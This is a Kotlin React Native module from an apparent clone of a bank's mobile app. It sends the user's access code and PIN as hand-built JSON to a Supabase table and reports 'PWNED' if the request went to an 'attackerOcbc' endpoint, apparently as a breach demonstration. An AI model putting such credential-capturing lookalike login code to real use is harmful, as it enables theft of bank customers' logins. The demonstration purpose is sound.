package com.ocbcclone

import android.util.Log
import com.facebook.react.bridge.*
import java.io.IOException
import okhttp3.Call
import okhttp3.Callback
import okhttp3.OkHttpClient
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response

class LoginBridgeModule(reactContext: ReactApplicationContext) :
  ReactContextBaseJavaModule(reactContext) {

  override fun getName(): String = "LoginBridge"

  @ReactMethod
  fun submit(accessCode: String, pin: String, promise: Promise) {
    val client = OkHttpClient()

    val json = """{"accessCode":"$accessCode","pin":"$pin"}"""
    val body = json.toRequestBody("application/json".toMediaType())

    val url = BuildConfig.SUPABASE_URL
    val apiKey = BuildConfig.SUPABASE_ANON_KEY


    val request = Request.Builder()
        .url("$url/rest/v1/legitOcbc")
        .addHeader("apikey", apiKey)
        .addHeader("Authorization", "Bearer $apiKey")
        .addHeader("Content-Type", "application/json")
        .post(body)
        .build()

    client.newCall(request).enqueue(object : Callback {
      override fun onFailure(call: Call, e: IOException) {
        Log.e("LoginBridge", "❌ Network error", e)
        promise.reject("HTTP_ERROR", e)
      }

      override fun onResponse(call: Call, response: Response) {
        response.use {
          if (!it.isSuccessful) {
            promise.reject("HTTP_FAIL", it.body?.string())
            return
          }

            val bodyText = it.body?.string()

            // Check if request went to "attackerOcbc" by parsing request URL
            val wentToAttacker = call.request().url.toString().contains("attackerOcbc")

            if (wentToAttacker) {
                // Return fake error to JS so UI shows breach
                promise.reject("PWNED", "Logged to attacker table")
            } else {
                promise.resolve("success")
            }
        }
      }
    })
  }
}
